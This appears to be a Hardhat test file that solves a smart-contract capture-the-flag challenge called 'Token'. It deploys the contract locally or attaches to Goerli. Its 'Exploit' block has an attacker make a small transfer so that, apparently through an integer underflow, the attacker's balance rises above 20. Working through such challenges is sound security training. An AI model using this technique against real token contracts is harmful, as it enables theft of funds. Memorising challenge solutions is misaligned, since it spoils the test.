const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Token', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Token');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Token', deployer);
            this.target = await ContractFactory.deploy(10000000000);
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        console.log(`\t balance before: ${await this.target.balanceOf(attacker.address)}`);
        let transferTX = await this.target.connect(attacker).transfer(this.target.address, 21); await transferTX.wait();
        console.log(`\t balance after : ${await this.target.balanceOf(attacker.address)}`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(parseInt(await this.target.balanceOf(attacker.address))).to.be.gt(20);
    });
});